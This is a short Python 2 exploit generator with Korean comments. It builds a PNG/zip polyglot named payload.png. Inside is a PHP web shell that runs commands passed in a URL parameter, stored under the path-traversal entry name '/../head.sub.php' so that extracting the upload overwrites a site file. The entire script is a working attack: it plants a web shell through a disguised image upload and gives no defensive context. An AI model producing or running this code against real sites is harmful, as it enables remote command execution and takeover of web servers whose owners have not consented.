import os

shell = '<?php system($_GET[x]); ?>'

# /../head.sub.php
# /../head.sub.php를 파일명으로 zip 압축을 함.
# target의 길이만큼 file을 생성해줘서 나중에 replace 해야됨.

target_file = '/../head.sub.php'
target_file_len = len(target_file)
print "[*] target_file len: " + str(target_file_len)
with open('A'*target_file_len, 'wb') as f:f.write(shell)

# zipping
# payload.png 로 타겟파일을 압축함
os.system("zip payload.png "+'A'*target_file_len)

# zip prefix
# 프리픽스를 맞춰서 zip 파일로 인식될 수 있게 zip header를 조작함
with open('base.png', 'rb') as f:base = f.read()
print "[*] prefix len: " + str(len(base))
os.system("python relocate_zip.py payload.png "+str(len(base))+" 0")

# get zip data
# zip 데이터를 가져옴
with open('payload.png', 'rb') as f:zip_data = f.read()

# generate
# 파일 두개를 합치고 AAAA했던걸 파일명으로 바꿈
with open('payload.png', 'wb') as f:f.write(base+zip_data.replace('A'*target_file_len, target_file))
print "[*] Generate OK"
